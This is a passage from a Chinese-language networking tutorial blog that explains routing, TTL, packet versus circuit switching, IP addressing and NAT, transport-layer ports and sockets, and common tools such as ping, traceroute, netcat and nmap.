<h3 id="◇路由的大致原理"><a href="#◇路由的大致原理" class="headerlink" title="◇路由的大致原理"></a>◇路由的大致原理</h3><p>　　聊完“拓扑”，再来聊“路由”。<br>　　当主机 A 向主机 B 发送网络层的数据时，大致会经历如下步骤：<br>1.<br>A 主机的协议栈先判断“A B 两个地址”是否在同一个子网（“子网掩码”就是用来干这事儿滴）。<br>如果是同一个子网，直接发给对方；如果不是同一个子网，发给本子网的【默认网关】。<br>（此处所说的“网关”指“3层网关/网络层网关”）<br>2.<br>对于“默认网关”，有可能自己就是路由器；也可能自己不是路由器，但与其它路由器相连。<br>也就是说，“默认网关”要么自己对数据包进行路由，要么丢给能进行路由的另一台设备。<br>（万一找不到能路由的设备，这个数据就被丢弃，于是网络通讯出错）<br>3.<br>当数据到达某个路由器之后，有如下几种可能——<br>3.1<br>该路由器正好是 B 所在子网的网关（与 B 直连），那就把数据包丢给 B，路由过程就结束啦；<br>3.2<br>亦或者，路由器会把数据包丢给另一个路由器（另一个路由器再丢给另一个路由器） …… 如此循环往复，最终到达目的地 B。<br>3.3<br>还存在一种可能性：始终找不到“主机 B”（有可能该主机“断线 or 关机 or 根本不存在”）。为了避免数据包长时间在网络上闲逛，还需要引入某种【数据包存活机制】（洋文叫做“Time To Live”，简称 TTL）。<br>通常会采用某个整数（TTL 计数）表示数据包能活多久。当主机 A 发出这个数据包的时候，这个“TTL 计数”就已经设置好了。每当这个数据包被路由器转发一次，“TTL 记数”就减一。当 TTL 变为零，这个数据包就死了（被丢弃）。</p>
<p>　　对于某些大型的复杂网络（比如互联网），每个路由器可能与其它 N 个路由器相连（N 可能很大）。对于上述的 3.2 情形，它如何判断：该转发给谁捏？<br>　　这时候，“路由算法”就体现出价值啦——<br>一般来说，路由器内部会维护一张【路由表】。每当收到一个网络层的数据包，先取出数据包中的【目标地址】，然后去查这张路由表，看谁距离目标最近，就把数据包转发给谁。<br>　　上面这段话看起来好像很简单，其实路由算法挺复杂滴。考虑到本文是“扫盲性质”，而且篇幅已经很长，不可能再去聊“路由算法”的细节。对此感兴趣的同学，可以去看《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1XQwaAMzuGuvmq5fCiTDMrh_pTUpCHJJ5C17btTv8kdE/">计算机网络</a>》的第5章。</p>
<h3 id="◇路由算法的演变史（以互联网为例）"><a href="#◇路由算法的演变史（以互联网为例）" class="headerlink" title="◇路由算法的演变史（以互联网为例）"></a>◇路由算法的演变史（以互联网为例）</h3><p>　　（技术菜鸟可以跳过这个小节）<br>　　由于互联网的 IP 协议已经成为“网络层协议”的事实标准，俺简单聊一下互联网的路由机制是如何进化滴。</p>
<p><strong>第1阶段：静态全局路由表</strong><br>　　（前面说了）互联网的前身是“阿帕网/ARPANET”。在阿帕网诞生初期（上世纪70年代），全球的主机很少。因此，早期的路由表很简单，既是“全局”滴，又是“静态”滴。简而言之，每个路由器内部都维护一张“全局路由表”，这个“路由表”包含了全球所有其它路由器的关联信息。每当来了一个数据包，查一下这张全局路由表，自然就清楚要转发给谁，才能最快到达目的地。<br>　　早期的阿帕网，主机的变化比较少，也很少增加路由器。每当出现一个新的路由器，其它路由器的管理员就手工编辑各自的“全局路由表”。<br>　　为了加深大伙儿印象，特意找来两张70年代初的阿帕网拓扑图（注：图中的 IMP 是“Interface Message Processor”的缩写，也就是如今所说的“路由器”）。</p>
<p><img src="https://lh5.googleusercontent.com/lgeICZCix4CsAg_VubQ00XSJr4eMmdOBSyINs3lbGOV25l1slX5K-6L_HHWWnj-sMQlNTVY0b01JzWL-g1zEn5y-VafJHEwLaJIwwqLEaP4I7JzxbMAk_3wvmnHO34NZYkb5rs98BtY" alt="不见图 请翻墙"><br>（1973年的阿帕网）</p>
<p><img src="https://lh6.googleusercontent.com/miI68qcASC4oz00YtHW6Pv_O0nLK_BZ0PWAxs4J5x-yteT2ya0gkiheH_RCIkX6ZX_soaf2tPPWbXNOYqdhtNaNbLA5OJ3w5Ko47pwXK4hmCtKmHrBmvciP1JYnZCwvUvRqlAtGllG8" alt="不见图 请翻墙"><br>（1977年的阿帕网）</p>
<p><strong>第2阶段：动态全局路由表</strong><br>　　后来，“阿帕网/互联网”的规模猛增，路由器数量也跟着猛增，隔三差五都有新的路由器冒出来。再用“静态路由表”这种机制，（编辑路由表的）管理员会被活活累死。于是改用“动态路由表”，并引入某种“路由发现机制”。但“路由表”依然是【全局】滴。</p>
<p><strong>第3阶段：动态分级路由表</strong><br>　　再到后来，全球的路由器越来越多，成千上万，再搞“全局路由表”已经不太现实了——<br>一方面，“全局路由表”越来越大（查询的速度就越来越慢）<br>另一方面，由于互联网的流量越来越大，每来一个数据包都要查表，查询越来越频繁。<br>　　于是，路由器开始吃不消了。为了解决困境，想出一个新招数：引入“分级路由”（hierarchical routing）。所谓的“分级路由”就是：把整个互联网分为多个大区域，每个大区域内部再分小区域，小区域内部再分小小区域 …… 看到这里，熟悉“数据结构与算法”的同学就会意识到——这相当于构造了一个【树状】层次结构。<br>　　有了这个层次结构，每个路由器重点关注：自己所在的那个最小化区域里面的网络拓扑。如此一来，每个路由器的“路由表”都会大幅度减小。</p>
<p><img src="https://lh5.googleusercontent.com/29WAIkuNnd2KC88vhFr7UG1ozUqnYQzt6k4VDmra_7Fiqu4lG4WKzEskw12GCuZgL8VKGd7aXI3KIqyGWNX8gwSRf_HzY8rDaG2VzFU9dp9q-wWYN1xyUixlefPu_MLtugsWWVBZfkE" alt="不见图 请翻墙"><br>（全局路由表 VS 分级路由表）</p>
<h3 id="◇互联网的路由——从“CAS”的角度看其健壮性"><a href="#◇互联网的路由——从“CAS”的角度看其健壮性" class="headerlink" title="◇互联网的路由——从“CAS”的角度看其健壮性"></a>◇互联网的路由——从“CAS”的角度看其健壮性</h3><p>　　去年（2020）俺写了一篇博文《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2020/04/Government-and-System-Robustness.html">“政治体制”与“系统健壮性”——基于“复杂性科学”的思考</a>》，其中介绍了“CAS”（复杂自适应系统）的概念。互联网的路由机制，就是一个典型的 CAS。<br>　　如果把互联网视作一个系统，每个公网上的路由器都是一个自适应的主体。假如某个地区的网络流量突然暴涨，骨干网路由器会自动分流；假如因为地震或战争，导致某个地区的骨干网路由器全部下线，周边地区的路由器也会自动避开这个区域 …..<br>　　所有这些工作，【不需要】依靠任何最高指挥中枢，去进行协调。<br>　　相反，如果互联网的路由系统中，设立了某种“中央委员会”进行实时调度，那互联网早就完蛋了，根本无法成长为今天这种规模。</p>
<h3 id="◇网络层的两种交换技术——电路交换（circuit-switching）-VS-分组交换（packet-switching）"><a href="#◇网络层的两种交换技术——电路交换（circuit-switching）-VS-分组交换（packet-switching）" class="headerlink" title="◇网络层的两种交换技术——电路交换（circuit switching） VS 分组交换（packet switching）"></a>◇网络层的两种交换技术——电路交换（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Circuit_switching">circuit switching</a>） VS 分组交换（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Packet_switching">packet switching</a>）</h3><p>　　（技术菜鸟可以跳过这个小节）<br>　　前面聊“互联网诞生”，说到兰德公司的“Baran 方案”。该方案对当时的电信系统提出几大革命性的变化，其中之一就是“分组交换”技术（也称“数据包交换”or“封包交换”）。<br>　　一般来说，网络层的设计有两种截然不同的风格：【电路交换 VS 分组交换】。有时候也分别称之为“有连接的网络层 VS 无连接的网络层”。此处所说的“连接”指的是某种“虚电路”（洋文叫做“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Virtual_circuit">virtual circuit</a>”，简称 VC）。</p>
<p>　　要理解“虚电路”，首先要从老式的电话系统说起。<br>　　最早期的电话，既没有拨号盘也没有按键，全靠一张嘴。当你拿起电话，先告诉接线员你要打给谁，接线员会用一根跳接线，插入电话交换设备的某个插孔，从而把你的电话机与对方的电话机相连。于是建立了一条两人之间的电话通路，也就是“电路”。你可以把“接线员”想象成某种“人肉路由器” :)</p>
<p><img src="https://lh4.googleusercontent.com/Ry_GjLe2vTj2fr1dnvGbwn4O6JbFbaEYKPKQyP1UMNba0AKt85b_SmM_fZhlnhBePly-ByLsI3v_r978aUKRY4AAG54ws1yPZglIbOuXZOKvP3vqjvqNdX8MOk0L0CW2vhoGpnI-Jcc" alt="不见图 请翻墙"><br>（1900年法国巴黎的电话交换局，可以看到接线员在操作电话交换设备）</p>
<p>　　后来发明了“自动电话交换机”，导致“接线员”全体下岗。虽然自动化了，但原理还是一样——当你在电话上拨了某人的号码，电话局的交换机会自动选择一条线路。只有当这条线路建立起来，对方的电话才会响。一旦双方开始通话，双方之间的语音都是通过这条线路传输。并且这条线路是独占的——只要通话不挂断，这条线路就不会再分配给其他人使用。</p>
<p>　　前面提到“互联网诞生的历史”，当时军方推动的“Baran 方案”被 AT＆T 断然拒绝。因为这个方案完全颠覆了传统的电话系统——<br>颠覆之1：把“模拟信号”颠覆为“数字信号”（这点比较好理解，俺就不解释了）<br>颠覆之2：把“星形拓扑”颠覆为“网状拓扑”（关于这点，前面的小节已经讨论了）<br>颠覆之3：把“电路交换”颠覆为“分组交换”（这就是本小节的重点）</p>
<p>　　为了帮大伙儿理解上述第3点，举个例子：<br>　　假设主机 A 要向主机 B 发送一大坨数据。因为数据太多，肯定要分成好几坨小一点的（分成多个数据包）。如何把这些数据包发送给对方捏？</p>
<p><strong>“电路交换”的实现方式</strong><br>在发送数据之前，要先建立连接通道（通过路由算法，找出 A ＆ B 之间的某条通路）。这条通路就是所谓的“虚电路/VC”。一旦 VC 建立，每一个数据包都是从这条拓扑路径进行路由。</p>
<p><strong>“分组交换”的实现方式</strong><br>在发送数据之前，【不需要】建立通道，让每个数据包独立进行路由。这种情况下，这几个数据包可能会走【不同的】拓扑路径。因此，数据包到达的顺序与发送的顺序【不一定】相同。接收方收到所有数据包之后，还要自己进行排序。<br>　　维基百科上有一个 GIF 动画（<a target="_blank" rel="noopener" href="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Packet_Switching.gif/480px-Packet_Switching.gif">这个链接</a>），比较直观地演示“分组交换/封包交换”的效果。由于这个动画稍微有点大（超过 1MB），俺就不贴到博文中了。</p>
<p>　　当时的电话系统主要承载语音传输，“电路交换”显然性能更高。那为啥 Baran 的设计要采用“分组交换”捏？俺又要再次提到【效率 VS 健壮性】之间的矛盾与均衡。<br>　　对于“电路交换”，一旦建立连接，同一个连接的所有数据都走相同的路径（会经过完全相同的路由器）。也就是说，传输的过程中，如果某个路由器挂掉了（网络掉线 or 硬件当机 or 软件崩溃）。那么，该路由器正在处理的 N 个连接全都要报废。而“分组交换”则更加灵活——即使某个路由器挂掉了，后续的数据包会自动转向另外的路由器，损失很小。<br>　　“Baran 方案”之所以采用“分组交换”的设计，因为人家这个方案是提交给军方用来应对【全面核战争】滴，当然要考虑健壮性啦。</p>
<p>　　话说这两种交换机制，各有很多支持者，并分裂为两大阵营，分别是：“电信阵营 VS 互联网阵营”。两大阵营的口水战持续了 N 年，都无法说服对方。到了后来设计 OSI 模型的时候，为了保持中立性与通用性，OSI 模型本身并没有强制要求网络层采用哪一种风格。<br>　　经过几十年之后，咱们已经可以看出来：“互联网阵营”占据主导地位。如今，连电信系统都是架构在互联网之上。</p>
<h2 id="★网络层：具体实例"><a href="#★网络层：具体实例" class="headerlink" title="★网络层：具体实例"></a>★网络层：具体实例</h2><h3 id="◇网络层的【协议】"><a href="#◇网络层的【协议】" class="headerlink" title="◇网络层的【协议】"></a>◇网络层的【协议】</h3><p>　　网络层的协议有很多。由于“互联网”已经成为全球的事实标准，因此俺只列出属于“互联网协议族”的那些“网络层协议”：<br>IP 协议（含 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IPv4">IPv4</a> ＆ <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IPv6">IPv6</a>）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol">ICMP</a><br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Internet_Group_Management_Protocol">IGMP</a><br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IPsec">IPSec</a><br>……<br>（考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。<br>　　对上述这些协议，最重要的当然是 IP 协议。如果你想要深入了解 IP 协议，可以参考如下这本书。关于 IP 协议的书，此书的影响力最大。这本书共3卷，通常只需看第1卷。<br>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1Fw2wSr-MgNm1d_M6F-rF1t_n3LwFWWBHrJt6vcYGta4/">TCP-IP 详解</a>》</p>
<h3 id="◇网络层的【协议实现】"><a href="#◇网络层的【协议实现】" class="headerlink" title="◇网络层的【协议实现】"></a>◇网络层的【协议实现】</h3><p>　　对于电脑主机（含移动设备），网络层的协议实现通常包含在操作系统自带的网络模块中（也就是“操作系统协议栈”）。具体参见如下示意图。<br>　　另外，还有一些专门的【3层】网络设备，也提供网络层的功能（参见本章节的后续小节）。</p>
<p><img src="https://lh4.googleusercontent.com/uYGaEvDYmziV-6EZ1AnRskoGpyKwxBcHgV5wgVtsDKmyP37OQgfX_zPYYeV3drFWBATFb95DYIwMPCgNApfg9Vtxrrpyvept6LNDQi0Vh3Fp6d31LFarI4ZjY1mSaQqP94HJaVQHBEQ" alt="不见图 请翻墙"><br>（OSI 模型中，不同层次的协议实现）</p>
<h3 id="◇IP-地址的格式及含义"><a href="#◇IP-地址的格式及含义" class="headerlink" title="◇IP 地址的格式及含义"></a>◇IP 地址的格式及含义</h3><p>　　当年设计阿帕网的时候，采用了【4字节】（32比特）来表示“网络层地址”（也就是 IP 地址）。<br>　　“IP 地址”的含义很重要，俺有必要解释一下：<br>　　咱们平时所说的 IP 地址，采用【点分十进制】来表示。就是把地址的4个字节，先翻译为十进制，然后每个字节用一个小数点分隔开（参见如下示意图）：</p>
<p><img src="https://lh5.googleusercontent.com/MCf0UTOAGLTbDJ5l46RlSHfidNm4PY7xqHrOBTP0P9OOneffxtC1B-VH_W2uBE7kCetsEMqTuLcS4niwj4MvqsXEA6QLeIvjTXQlGtBmgzL1d7VgrA5Na7YguV7OBKGzk9qvx_FrFHM" alt="不见图 请翻墙"><br>（4字节 IP 地址：“二进制”与“点分十进制”的对照示意图）</p>
<p>　　“IP 地址”的32比特，分为两部分：第1部分用来标识【子网】，第2部分用来标识该子网中的【主机】。<br>　　这两部分各占用多少比特，是不确定的。在这种情况下，“操作系统协议栈”如何知道哪些比特标识“子网”，哪些比特标识“主机”捏？奥妙在于【子网掩码】。所以，大伙儿在给系统配置 IP 地址的时候，通常都需要再设置一个【子网掩码】，就这个用途。</p>
<h3 id="◇IP-地址枯竭，及其解决方法"><a href="#◇IP-地址枯竭，及其解决方法" class="headerlink" title="◇IP 地址枯竭，及其解决方法"></a>◇IP 地址枯竭，及其解决方法</h3><p>　　前一个小节提到：IP地址包含【4字节】（32比特）。因此，最多只能表示【2的32次方】（42亿左右）的不同地址。考虑到还有很多地址保留给特殊用途，实际可用地址远远不到42亿。<br>　　到了如今，全球网民都已经几十亿了，IP 地址开始枯竭。咋办捏？为了解决这个问题，发展出若干技术手段。简单说一下最常见的几种手段：</p>
<p><strong>IPv6</strong><br>　　名气最大（最多人知道）的技术手段，大概是 IPv6 了。这招想要一劳永逸地解决地址枯竭的问题，采用了16字节（128比特）来表示 IP 地址。<br>　　设计 IPv6 的人自豪地宣称：即使给地球上的每一粒沙子分配一个 IPv6 地址，依然绰绰有余（确实没有吹牛，“2的128次方”是天文数字）。<br>　　但 IPv6 的缺点在于，【无法】向下兼容原有的 IP 协议（原有的协议叫“IPv4”）。IPv6 的普及一直比较慢，这是主要原因。</p>
<p><strong>代理服务器（proxy）</strong><br>　　一看到代理，很多人就想到翻墙。其实它也可以用来解决“地址枯竭”的问题。<br>　　比如说，某个公司有100人，100台电脑。如果每台电脑都分配公网 IP 地址，就要消耗100个公网地址（太浪费啦）。<br>　　可以只申请一个公网 IP，然后在内网搞一个代理服务器，公网 IP 分配给它（代理服务器有两个网卡，一个接内网，一个接公网）。然后在其它电脑上设置代理，指向这台代理服务器，就都可以上外网啦。<br>　　（注：在本文的末尾有一个 ★杂项 的章节，会专门聊一下“代理”这个话题）</p>
<p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2">网络地址转换</a>（NAT）</strong><br>　　前面 proxy 那招有个缺点：内网的每台电脑里面的每个上网软件，都要单独设置代理。实在太麻烦啦！<br>　　后来就发明了某种更牛逼的招数——网络地址转换（洋文是“Network Address Translation”，简称 NAT）。<br>　　用了这招，还是只要申请一个公网 IP，分配给内网的网关（网关有两个网卡，一个接内网，一个接公网）。然后在内网的网关配置 NAT 功能，自动就可以让内网的每台电脑访问外网。<br>　　在<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/12/system-vm-5.html">这篇博文</a>，俺介绍了虚拟机的几种“网卡模式”，其中有一种模式叫做【NAT 模式】，就是指这个玩意儿。<br>　　采用了 NAT 技术之后，可能会对某些应用软件（尤其是 P2P 类型的）造成兼容性问题，于是又发明了一些“NAT 穿透技术”（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/NAT_traversal">NAT traversal</a>）。这类技术有好几种，如果有空的话，俺会单独写教程介绍。</p>
<p><strong>其它解决方法</strong><br>　　关于“IPv4 地址空间耗尽”，解决方法肯定不止上面这几招。限于篇幅，就此打住。更多的讨论参见维基百科的“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IPv4_address_exhaustion">这个链接</a>”。</p>
<h3 id="◇网络层相关的【网络设备】"><a href="#◇网络层相关的【网络设备】" class="headerlink" title="◇网络层相关的【网络设备】"></a>◇网络层相关的【网络设备】</h3><p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E5%99%A8">路由器</a>（router）</strong><br>　　（前面章节聊“路由原理”的时候，已经介绍过它；这里就不再浪费口水啦）</p>
<p><strong>3层交换机（Layer 3 switching）</strong><br>　　“3层交换机”是在“2层交换机”的基础上，增加了对网络层的处理。因此，它可以做到类似路由器的效果——在几个子网之间转发数据。<br>　　与路由器的差别在于——“3层交换机”链接的几个子网是【同种】网络；而路由器可以连接【异种】网络。<br>　　从上面这句话看，“3层交换机”的能力显然不如“路由器”。既然已经有“路由器”，为啥还要发明“3层交换机”捏？这就要说到【单臂路由器】的弊端。<br>　　对于企业内网的“2层交换机”，通常都支持 VLAN 功能。通俗地说：可以在交换机中划分多个【虚拟子网】。其实这些子网的中所有的电脑，都还是接入这台交换机，只不过这些子网配置了不同的网络地址。对于同一个 VLAN 内部的通讯，“2层交换机”自己就可以搞定（只需要用到2层协议）；但对于【跨】VLAN 主机之间的通讯，“2层交换机”就没戏啦（它没有路由功能）。因此，就必须在它旁边外加一个路由器，形成如下拓扑结构。在这个拓扑中，路由器只与单个设备（2层交换机）相连，所以称之为“单臂”。<br>　　请注意：如下示意图只画了两台电脑，位于两个 VLAN。实际上可能有很多个 VLAN，每个里面有几十台电脑。于是，交换机与路由器之间的传输通道就会成为瓶颈——【跨】VLAN 的任意两台电脑通讯，数据包都要到路由器那里兜一圈。为了消除这种瓶颈，才发明了“3层交换机”——把路由功能直接集成到交换机内部。</p>
<p><img src="https://lh4.googleusercontent.com/FTo8x8w2DwhPaz10fDJ2LdwywSaaPLlciSaH4wg0HY_sHKT0MHvDN6k2ZxAvyzojuzGpklzg7hBV1iolR40_1_LaxIqYeOa1lo0IWQrb0_cpJzoGQbdZCu7fPcgieH897MuEPwlA5Gw" alt="不见图 请翻墙"><br>（“单臂路由器”的拓扑结构）</p>
<p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%84%A1%E7%B7%9A%E6%8E%A5%E5%85%A5%E9%BB%9E">无线热点</a>（Wireless Access Point）</strong><br>　　“无线热点”通常用来提供无线接入，使得某个【无线】设备能接入到某个【有线】网络中。一般来说，热点都内置了路由功能，那么它就是“无线路由器”，对应到“3层”（网络层）。反之，如果没有路由功能，它就是“网桥”，属于“2层”（链路层）。</p>
<h3 id="◇网络层相关的【软件工具】"><a href="#◇网络层相关的【软件工具】" class="headerlink" title="◇网络层相关的【软件工具】"></a>◇网络层相关的【软件工具】</h3><p><strong><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Ping_(networking_utility)">ping</a></strong><br>　　这个命令，很多人应该都知道。早在 Win9x 就有这个命令了。它使用（网络层的）ICMP 协议来测试某个远程主机是否可达。<br>　　提醒一下：<br>　　如果 ping 命令显示某个 IP 地址不可达，有很多种情况。比如说：</p>
<blockquote>
<p>这个 IP 地址对应的主机已经关机<br>这个 IP 地址对应的主机已经断线<br>这个 IP 地址对应的主机拒绝响应 ICMP 协议<br>从你本机到这个 IP 地址之间，有某个防火墙拦截了 ICMP 协议<br>……</p>
</blockquote>
<p><strong><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Traceroute">traceroute</a></strong><br>　　这是一个通用的工具，用来测试路由。很早以前的 Windows 就已经内置了它，命令是 <code>tracert</code>。在 POSIX（Linux＆UNIX）上通常叫 <code>traceroute</code><br>　　你可以用这个命令，测试你本机与互联网另一台主机之间的路由（也就是：从你本机到对方主机，要经过哪些路由器）</p>
<h2 id="★传输层：概述"><a href="#★传输层：概述" class="headerlink" title="★传输层：概述"></a>★传输层：概述</h2><h3 id="◇传输层的必要性"><a href="#◇传输层的必要性" class="headerlink" title="◇传输层的必要性"></a>◇传输层的必要性</h3><p><strong>屏蔽“有连接 or 无连接”的差异</strong><br>　　（上一个章节提到）网络层本身已经屏蔽了【异种网络】的差异（比如“以太网、ATM、帧中继”之间的差异），而且网络层也屏蔽了路由的细节。但网络层本身还有一个差异，也就是网络层的两种交换技术：电路交换（有连接） VS 分组交换（无连接）。<br>　　前面章节也提到了：上述两种交换技术各有很多支持者，并分裂为两大阵营。当年设计 OSI 模型的时候，为了保持中立性与通用性，并没有强制规定“网络层”必须采用何种交换机制。<br>　　对于开发网络软件的程序员来说，当然不想操心“网络层用的是哪一种交换机制”。因此，需要对网络层的上述差异再加一个抽象层（也就是“传输层”）。</p>
<p><strong>从“主机”到“进程”</strong><br>　　前面介绍的“网络层”，其设计是面向主机（电脑）。“网络层地址”也就是某个主机的地址。<br>　　而“传输层”是面向【进程】滴！因为传输层要提供给【网络软件】使用，而网络软件打交道的对象是【另一个网络软件】。因此，传输层必须在“网络层地址”的基础上，再引入某种新的标识，用来区分同一台主机上的不同【进程】。</p>
<h3 id="◇传输层的特殊性"><a href="#◇传输层的特殊性" class="headerlink" title="◇传输层的特殊性"></a>◇传输层的特殊性</h3><p>　　在 OSI 7层模型中，传输层正好居中。这是一个很特殊的位置。<br>　　OSI 模型最下面3层，与【网络设备】比较密切。这里面所说的“网络设备”，既包括那些独立的主机（比如“路由器、交换机、等”），也包括电脑上的硬件（比如“网卡”）。<br>　　OSI 模型最上面3层，与【网络软件】比较密切（或者说，与“用户的业务逻辑”比较密切）。<br>　　而中间的传输层，正好是承上启下。对于开发应用软件的程序猿/程序媛，“传输层”是他们能感知的最低一层。</p>
<h3 id="◇传输层的【端口】"><a href="#◇传输层的【端口】" class="headerlink" title="◇传输层的【端口】"></a>◇传输层的【端口】</h3><p>　　刚才谈“传输层的必要性”，提到说——“网络层地址”只能标识【主机】，而传输层必须要能标识【进程】。为了达到这个目的，于是就引入了“传输层端口”这个概念（为了打字省力，后续讨论简称为“端口”）。<br>　　在 OSI 模型中，“端口”的官方称呼是“传输服务访问点”（洋文缩写 TSAP）。但是作为程序员，俺已经习惯于“端口”这个称呼。后续介绍依然用“端口”一词。<br>　　当程序员使用传输层提供的 API 开发网络软件时，通常把“端口”与“网络地址”一起使用（构成“二元组”），就可以定位到某个主机上的某个进程。</p>
<h2 id="★传输层：具体实例"><a href="#★传输层：具体实例" class="headerlink" title="★传输层：具体实例"></a>★传输层：具体实例</h2><h3 id="◇传输层的【协议】"><a href="#◇传输层的【协议】" class="headerlink" title="◇传输层的【协议】"></a>◇传输层的【协议】</h3><p>　　为了让程序员可以更爽地使用传输层来开发网络软件，传输层既要提供“有连接”的风格，也要提供“无连接”的风格。关于这两种风格的对比，前面已经聊过，这里不再浪费口水。<br>　　具体到“互联网协议族”，有两个主要的传输层实现，分别是 TCP ＆ UDP（前者是“有连接”，后者是“无连接”）。<br>　　除了 TCP ＆ UDP，“互联网协议族”还提供了其它一些传输层协议。因为比较冷门，俺就不介绍啦。</p>
<h3 id="◇传输层的【协议实现】"><a href="#◇传输层的【协议实现】" class="headerlink" title="◇传输层的【协议实现】"></a>◇传输层的【协议实现】</h3><p>　　对于电脑主机（含移动设备），传输层的协议实现通常包含在操作系统自带的网络模块中（也就是“操作系统协议栈”）。具体参见如下示意图。<br>　　另外，还有一些专门的【4层】网络设备，也提供传输层的功能（参见后续的小节）。</p>
<p><img src="https://lh4.googleusercontent.com/uYGaEvDYmziV-6EZ1AnRskoGpyKwxBcHgV5wgVtsDKmyP37OQgfX_zPYYeV3drFWBATFb95DYIwMPCgNApfg9Vtxrrpyvept6LNDQi0Vh3Fp6d31LFarI4ZjY1mSaQqP94HJaVQHBEQ" alt="不见图 请翻墙"><br>（OSI 模型中，不同层次的协议实现）</p>
<h3 id="◇套接字（socket-API）"><a href="#◇套接字（socket-API）" class="headerlink" title="◇套接字（socket API）"></a>◇套接字（socket API）</h3><p>　　前面说了：传输层是面向程序员（让他们可以更方便地开发网络软件）。因此，就需要提供一些封装传输层的【库】（API）。程序员只需要调用这些【库】，就可以使用传输层的协议进行通讯啦。<br>　　影响力最大的传输层封装库，当然是 socket API。它来自加州大学伯克利分校。<br>　　在互联网诞生初期，伯克利分校开发了一个 UNIX 操作系统的的变种，叫做“伯克利 UNIX 发行版”（BSD Unix），也就是如今 BSD 操作系统的前身。伯克利发行版内置了一套用来进行网络编程的 API，当时叫做“伯克利套接字”（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Berkeley_sockets">Berkeley sockets</a>）。由于这套 API 用起来很方便，很多其它的 UNIX 变种也移植了这套 API，于是就逐渐成了业界的事实标准。到了上世纪90年代，Windows ＆ Linux 也都提供了这套 API。<br>　　由于大部分读者不是程序员，“套接字”这个话题就到此为止。如果你是个程序员，并且对网络编程感兴趣，可以参考<a target="_blank" rel="noopener" href="https://github.com/programthink/books">俺的电子书清单</a>，其中有一个分类目录是【IT 类 / 软件开发 / 网络相关】。</p>
<h3 id="◇传输层相关的【网络设备】"><a href="#◇传输层相关的【网络设备】" class="headerlink" title="◇传输层相关的【网络设备】"></a>◇传输层相关的【网络设备】</h3><p><strong>4层交换机（Layer 4 switching）</strong><br>　　前面已经介绍了“3层交换机”，“4层交换机”是其进一步的改良，可以识别传输层的协议，获取 TCP or UDP 的端口号。<br>　　有了这个能力，网管就可以在这种交换机上配置一些管理策略。比如说：（根据传输层端口号）过滤掉某种流量，或者对某种流量设置转发的优先级。</p>
<p><strong>状态防火墙（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Stateful_firewall">stateful firewall</a>）</strong><br>　　网络防火墙分好几种，大部分属于这种。它能完全处理 TCP 协议的状态，显然它属于“4层”（传输层）。</p>
<h3 id="◇传输层相关的【软件工具】"><a href="#◇传输层相关的【软件工具】" class="headerlink" title="◇传输层相关的【软件工具】"></a>◇传输层相关的【软件工具】</h3><p><strong><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Netcat">netcat</a> 家族</strong>——传输层的“瑞士军刀”<br>　　关于 netcat，俺已经写过一篇比较详细的教程：《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2019/09/Netcat-Tricks.html">扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”</a>》。看完这篇教程，你肯定能体会它功能的强大——很多与 TCP/UDP 相关的事情，都可以用 netcat 搞定。<br>　　另外，netcat 还有很多衍生品（衍生的开源项目），构成一个丰富的 netcat 家族。在上述教程也有介绍。</p>
<p><strong>netstat ＆ ss</strong><br>　　Windows 和 POSIX（Linux＆UNIX）都有一个 <code>netstat</code> 命令，可以查看当前系统的 TCP/UDP 状态（包括当前系统开启了哪些监听端口）。<br>　　另外，Linux 上还有一个 <code>ss</code> 命令，功能更强（但这个命令在 Windows 上默认没有）</p>
<p><strong><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Nmap">nmap</a></strong><br>　　这是最著名的开源的扫描器，可以扫描远程主机监听了哪些传输层端口（注：前面提到的“netcat 家族”也可以干这事儿）<br><code>nmap</code> 的功能很强，“端口扫描”只是其功能之一。</p>
<h2 id="★业务层（OSI-上三层）：概述"><a href="#★业务层（OSI-上三层）：概述" class="headerlink" title="★业务层（OSI 上三层）：概述"></a>★业务层（OSI 上三层）：概述</h2><p>　　一不小心，这篇教程已经写了这么长。为了照顾那些有“阅读障碍”的读者，俺要稍微控制一下篇幅，就把 OSI 的【上三层】合在一起讨论。<br>　　前面的章节说过：【上三层】更接近于“网络软件”，对应的是应用软件的业务逻辑，因此俺统称为“业务层”。<br>　　注：有些书（比如《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1XQwaAMzuGuvmq5fCiTDMrh_pTUpCHJJ5C17btTv8kdE/">计算机网络</a>》）会把 OSI 的上三层统称为“应用层”。由于 OSI 模型中本来就有一个“应用层”，俺认为这样容易搞混（尤其不利于技术菜鸟），所以另外起了一个“业务层”的名称。</p>
